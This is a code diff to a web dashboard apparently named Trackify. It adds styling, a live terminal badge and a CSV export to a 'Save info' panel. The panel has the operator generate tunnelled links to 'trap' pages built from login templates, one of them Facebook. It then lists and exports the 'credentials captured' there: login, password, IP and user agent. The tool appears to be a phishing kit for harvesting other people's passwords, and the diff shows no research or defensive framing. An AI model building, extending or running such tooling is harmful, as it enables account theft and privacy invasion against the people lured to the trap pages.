@@ -1195,37 +1195,145 @@ $userNavInitial = $userNavInitial ?? '?';
             padding: 40px;
             overflow-y: auto;
         }
+        .terminal-card-head {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 12px;
+        }
+        .terminal-card-head h2 {
+            margin-bottom: 0;
+        }
+        .terminal-card-badge {
+            font-size: 11px;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 0.07em;
+            color: var(--accent-green);
+            background: rgba(63, 185, 80, 0.12);
+            border: 1px solid rgba(63, 185, 80, 0.35);
+            padding: 4px 10px;
+            border-radius: 999px;
+        }
+        .terminal-card-badge--saveinfo {
+            color: #39bae6;
+            background: rgba(57, 186, 230, 0.1);
+            border-color: rgba(57, 186, 230, 0.35);
+        }
+        .card-terminal-panel .phone-lookup-terminal {
+            max-height: min(480px, 52vh);
+            background: linear-gradient(180deg, #070a10 0%, #05070c 100%);
+            box-shadow: inset 0 0 0 1px rgba(88, 166, 255, 0.07);
+        }
+        .save-info-stack {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            min-width: 0;
+        }
         .saved-info-wrap {
-            overflow-x: auto;
-            margin-top: 8px;
+            margin-top: 0;
+        }
+        .saved-logins-card .saved-logins-card-head {
+            display: flex;
+            align-items: baseline;
+            justify-content: space-between;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+        .saved-logins-card .saved-logins-card-head h2 {
+            margin-bottom: 0;
+        }
+        .saved-logins-count {
+            font-size: 12px;
+            color: var(--text-muted);
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .saved-logins-intro {
+            margin: 0 0 14px;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        .saved-logins-toolbar {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 14px;
+        }
+        .saved-logins-toolbar .btn {
+            flex: 1 1 auto;
+            min-width: 120px;
+            justify-content: center;
+        }
+        .saved-info-table-scroll {
+            max-height: min(520px, 55vh);
+            overflow: auto;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: var(--bg-dark);
         }
         .saved-info-table {
             width: 100%;
-            border-collapse: collapse;
+            border-collapse: separate;
+            border-spacing: 0;
             font-size: 13px;
         }
         .saved-info-table th,
         .saved-info-table td {
             text-align: left;
-            padding: 10px 12px;
+            padding: 12px 14px;
             border-bottom: 1px solid var(--border);
             vertical-align: top;
             word-break: break-word;
         }
+        .saved-info-table tbody tr:last-child td {
+            border-bottom: none;
+        }
         .saved-info-table th {
+            position: sticky;
+            top: 0;
+            z-index: 2;
             color: var(--text-muted);
             font-weight: 600;
-            font-size: 12px;
+            font-size: 11px;
             text-transform: uppercase;
-            letter-spacing: 0.04em;
+            letter-spacing: 0.05em;
+            background: #121820;
+            box-shadow: 0 1px 0 var(--border);
+        }
+        .saved-info-table tbody tr:nth-child(even) td {
+            background: rgba(255, 255, 255, 0.02);
         }
         .saved-info-table tbody tr:hover td {
-            background: rgba(88, 166, 255, 0.06);
+            background: rgba(88, 166, 255, 0.08);
+        }
+        .saved-info-cell-mono {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+        }
+        .saved-info-cell-template {
+            font-weight: 500;
+            color: var(--text);
+        }
+        .saved-info-cell-time {
+            white-space: nowrap;
+            font-size: 12px;
+            color: var(--text-muted);
+            font-family: 'JetBrains Mono', monospace;
         }
         .saved-info-empty {
             color: var(--text-muted);
-            padding: 24px 0;
+            padding: 28px 16px;
             text-align: center;
+            font-size: 14px;
+            line-height: 1.5;
+            border: 1px dashed var(--border);
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.2);
         }
         .phone-layout-inner {
             max-width: 1680px;
@@ -1578,8 +1686,11 @@ $userNavInitial = $userNavInitial ?? '?';
                 </div>
             </div>
 
-            <div class="card">
-                <h2>Terminal</h2>
+            <div class="card card-terminal-panel">
+                <div class="terminal-card-head">
+                    <h2>Terminal</h2>
+                    <span class="terminal-card-badge" aria-hidden="true">Live</span>
+                </div>
                 <div class="phone-lookup-terminal" id="terminal">
                     <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Waiting for targets, Press Ctrl + C to exit...</div>
                     <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:~# </span><span class="terminal-cursor"></span></div>
@@ -1714,43 +1825,60 @@ $userNavInitial = $userNavInitial ?? '?';
         <section id="saveInfoLayout" class="phone-layout" style="display:none" aria-label="Save info">
             <div class="phone-layout-inner">
                 <div class="phone-layout-columns">
-                    <div class="card">
-                        <h2>Save info</h2>
-                        <p style="margin:8px 0 16px;color:var(--text-muted);font-size:14px;line-height:1.5">
-                            Templates live in <code style="font-size:12px">saveinfo-templates/</code> (not Trackify). Pick one, generate a tunnel, and share the URL ending in <code style="font-size:12px">saveinfo_entry.php</code> — it redirects to the matching <code style="font-size:12px">saveinfo-trap-…</code> page. Trackify root is unchanged. Up to <span id="savedInfoMax">500</span> stored submissions.
-                        </p>
-                        <div class="phone-lookup-input-wrap">
-                            <label for="siTemplate">Template</label>
-                            <select id="siTemplate">
-                                <option value="">Loading templates…</option>
-                            </select>
+                    <div class="save-info-stack">
+                        <div class="card">
+                            <h2>Save info</h2>
+                            <p class="saved-logins-intro" style="margin-top:8px;color:var(--text-muted)">
+                                Templates live in <code style="font-size:12px">saveinfo-templates/</code> (not Trackify). Pick one, generate a tunnel, and share the URL ending in <code style="font-size:12px">saveinfo_entry.php</code> — it redirects to the matching <code style="font-size:12px">saveinfo-trap-…</code> page. Trackify root is unchanged. Up to <span id="savedInfoMax">500</span> stored submissions.
+                            </p>
+                            <div class="phone-lookup-input-wrap">
+                                <label for="siTemplate">Template</label>
+                                <select id="siTemplate">
+                                    <option value="">Loading templates…</option>
+                                </select>
+                            </div>
+                            <div id="siTemplateHint" class="phone-lookup-error" style="margin-top:8px;border:none;padding:0;color:var(--text-muted);font-size:13px" hidden></div>
+                            <div class="phone-lookup-actions" style="margin-top:16px">
+                                <button type="button" class="btn btn-primary btn-generate" id="siGenerateBtn" onclick="generateSaveInfoLink()">
+                                    <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+                                    <span>Generate</span>
+                                </button>
+                            </div>
+                            <div id="siLinkBox" class="link-box" style="display:none;margin-top:16px">
+                                <input type="text" class="link-input" id="siTrackerLink" readonly>
+                                <button type="button" class="btn btn-secondary" onclick="copySaveInfoLink()">Copy</button>
+                                <button type="button" class="btn btn-danger" id="siStopBtn" onclick="stopService()">Stop</button>
+                            </div>
                         </div>
-                        <div id="siTemplateHint" class="phone-lookup-error" style="margin-top:8px;border:none;padding:0;color:var(--text-muted);font-size:13px" hidden></div>
-                        <div class="phone-lookup-actions" style="margin-top:16px">
-                            <button type="button" class="btn btn-primary btn-generate" id="siGenerateBtn" onclick="generateSaveInfoLink()">
-                                <svg class="btn-generate-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
-                                <span>Generate</span>
-                            </button>
-                        </div>
-                        <div id="siLinkBox" class="link-box" style="display:none;margin-top:16px">
-                            <input type="text" class="link-input" id="siTrackerLink" readonly>
-                            <button type="button" class="btn btn-secondary" onclick="copySaveInfoLink()">Copy</button>
-                            <button type="button" class="btn btn-danger" id="siStopBtn" onclick="stopService()">Stop</button>
-                        </div>
-                        <div id="saveInfoTerminalWrap" class="phone-lookup-results" style="margin-top:20px" aria-live="polite">
-                            <div class="phone-lookup-terminal" id="saveInfoTerminal">
-                                <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Tunnel activity and submissions (shared with Trackify when using one tunnel).</div>
-                                <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:save-info# </span><span class="terminal-cursor"></span></div>
+                        <div class="card card-terminal-panel">
+                            <div class="terminal-card-head">
+                                <h2>Terminal</h2>
+                                <span class="terminal-card-badge terminal-card-badge--saveinfo" aria-hidden="true">Save info</span>
+                            </div>
+                            <div id="saveInfoTerminalWrap" class="phone-lookup-results" style="margin-top:0" aria-live="polite">
+                                <div class="phone-lookup-terminal" id="saveInfoTerminal">
+                                    <div class="phone-lookup-terminal-line"><span class="hint">[*]</span> Tunnel activity and submissions (shared with Trackify when using one tunnel).</div>
+                                    <div class="phone-lookup-terminal-line"><span class="prompt">root@trackify:save-info# </span><span class="terminal-cursor"></span></div>
+                                </div>
                             </div>
                         </div>
                     </div>
                     <div class="phone-history">
-                        <div class="phone-history-title">Saved submissions</div>
-                        <div class="phone-lookup-actions" style="margin-bottom:12px">
-                            <button type="button" class="btn btn-danger" id="clearSavedInfoBtn" onclick="clearSavedInfo()" style="width:100%">Clear all saved entries</button>
-                        </div>
-                        <div id="savedInfoWrap" class="saved-info-wrap" aria-live="polite">
-                            <div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Save info URL and submit the form on the trap page.</div>
+                        <div class="card saved-logins-card">
+                            <div class="saved-logins-card-head">
+                                <h2>Saved logins</h2>
+                                <span class="saved-logins-count" id="savedInfoCountMeta" aria-live="polite"></span>
+                            </div>
+                            <p class="saved-logins-intro" style="color:var(--text-muted);margin-bottom:0">
+                                Credentials captured from Save info trap pages (newest first).
+                            </p>
+                            <div class="saved-logins-toolbar">
+                                <button type="button" class="btn btn-secondary" id="exportSavedInfoBtn" onclick="exportSavedInfoCsv()" disabled>Export CSV</button>
+                                <button type="button" class="btn btn-danger" id="clearSavedInfoBtn" onclick="clearSavedInfo()">Clear all</button>
+                            </div>
+                            <div id="savedInfoWrap" class="saved-info-wrap" aria-live="polite">
+                                <div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Save info URL and submit the form on the trap page.</div>
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -1854,6 +1982,7 @@ $userNavInitial = $userNavInitial ?? '?';
         const statusLink = document.getElementById('statusLink');
         const capturesList = document.getElementById('capturesList');
         let currentPage = 1;
+        let lastSavedInfoEntries = [];
 
         async function syncPayloadOptions() {
             const formData = new FormData();
@@ -3274,9 +3403,51 @@ $userNavInitial = $userNavInitial ?? '?';
             }
         }
 
+        function csvEscapeCell(val) {
+            const s = String(val == null ? '' : val);
+            if (/[",\n\r]/.test(s)) {
+                return '"' + s.replace(/"/g, '""') + '"';
+            }
+            return s;
+        }
+
+        function exportSavedInfoCsv() {
+            if (!lastSavedInfoEntries || lastSavedInfoEntries.length === 0) {
+                return;
+            }
+            const headers = ['Time (UTC)', 'Login', 'Password', 'Template', 'IP', 'User agent'];
+            const lines = lastSavedInfoEntries.map(function (row) {
+                return [
+                    row.at || '',
+                    row.login || '',
+                    row.password || '',
+                    row.template_label || row.template || '',
+                    row.ip || '',
+                    row.user_agent || ''
+                ].map(csvEscapeCell).join(',');
+            });
+            const csv = '\uFEFF' + headers.map(csvEscapeCell).join(',') + '\n' + lines.join('\n');
+            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'trackify-saved-logins-' + new Date().toISOString().slice(0, 19).replace(/[:T]/g, '-') + '.csv';
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+            URL.revokeObjectURL(a.href);
+            const toast = document.getElementById('toast');
+            if (toast) {
+                toast.textContent = 'CSV exported';
+                toast.classList.add('show');
+                setTimeout(function () { toast.classList.remove('show'); }, 2000);
+            }
+        }
+
         async function loadSavedInfo() {
             const wrap = document.getElementById('savedInfoWrap');
             const maxEl = document.getElementById('savedInfoMax');
+            const countMeta = document.getElementById('savedInfoCountMeta');
+            const exportBtn = document.getElementById('exportSavedInfoBtn');
             if (!wrap) {
                 return;
             }
@@ -3284,6 +3455,13 @@ $userNavInitial = $userNavInitial ?? '?';
                 const res = await fetch(API + '?action=saved_info', { credentials: 'same-origin' });
                 const data = await res.json().catch(() => ({}));
                 if (data.status !== 'success' || !Array.isArray(data.entries)) {
+                    lastSavedInfoEntries = [];
+                    if (exportBtn) {
+                        exportBtn.disabled = true;
+                    }
+                    if (countMeta) {
+                        countMeta.textContent = '';
+                    }
                     wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
                     return;
                 }
@@ -3291,16 +3469,47 @@ $userNavInitial = $userNavInitial ?? '?';
                     maxEl.textContent = String(data.max_entries);
                 }
                 if (data.entries.length === 0) {
-                    wrap.innerHTML = '<div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a link with the Facebook template and submit the form on the trap page.</div>';
+                    lastSavedInfoEntries = [];
+                    if (exportBtn) {
+                        exportBtn.disabled = true;
+                    }
+                    if (countMeta) {
+                        countMeta.textContent = data.max_entries != null ? '0 / ' + data.max_entries : '';
+                    }
+                    wrap.innerHTML = '<div class="saved-info-empty" id="savedInfoEmpty">No saved logins yet. Generate a Save info URL and submit the form on the trap page.</div>';
                     return;
                 }
-                let html = '<table class="saved-info-table"><thead><tr><th>Time (UTC)</th><th>Login</th><th>Password</th><th>Template</th><th>IP</th><th>User agent</th></tr></thead><tbody>';
+                lastSavedInfoEntries = data.entries;
+                if (exportBtn) {
+                    exportBtn.disabled = false;
+                }
+                if (countMeta) {
+                    countMeta.textContent = data.max_entries != null
+                        ? (data.entries.length + ' / ' + data.max_entries)
+                        : String(data.entries.length);
+                }
+                let html = '<div class="saved-info-table-scroll"><table class="saved-info-table"><thead><tr>';
+                html += '<th scope="col">Time</th><th scope="col">Login</th><th scope="col">Password</th><th scope="col">Template</th><th scope="col">IP</th><th scope="col">User agent</th>';
+                html += '</tr></thead><tbody>';
                 data.entries.forEach(function (row) {
-                    html += '<tr><td>' + escapeHtmlText(row.at || '') + '</td><td>' + escapeHtmlText(row.login || '') + '</td><td>' + escapeHtmlText(row.password || '') + '</td><td>' + escapeHtmlText(row.template || '') + '</td><td>' + escapeHtmlText(row.ip || '') + '</td><td>' + escapeHtmlText(row.user_agent || '') + '</td></tr>';
+                    const tpl = escapeHtmlText(row.template_label || row.template || '');
+                    html += '<tr><td class="saved-info-cell-time">' + escapeHtmlText(row.at || '') + '</td>';
+                    html += '<td class="saved-info-cell-mono">' + escapeHtmlText(row.login || '') + '</td>';
+                    html += '<td class="saved-info-cell-mono">' + escapeHtmlText(row.password || '') + '</td>';
+                    html += '<td class="saved-info-cell-template">' + tpl + '</td>';
+                    html += '<td class="saved-info-cell-mono">' + escapeHtmlText(row.ip || '') + '</td>';
+                    html += '<td>' + escapeHtmlText(row.user_agent || '') + '</td></tr>';
                 });
-                html += '</tbody></table>';
+                html += '</tbody></table></div>';
                 wrap.innerHTML = html;
             } catch (e) {
+                lastSavedInfoEntries = [];
+                if (exportBtn) {
+                    exportBtn.disabled = true;
+                }
+                if (countMeta) {
+                    countMeta.textContent = '';
+                }
                 wrap.innerHTML = '<div class="saved-info-empty">Could not load saved entries.</div>';
             }
         }
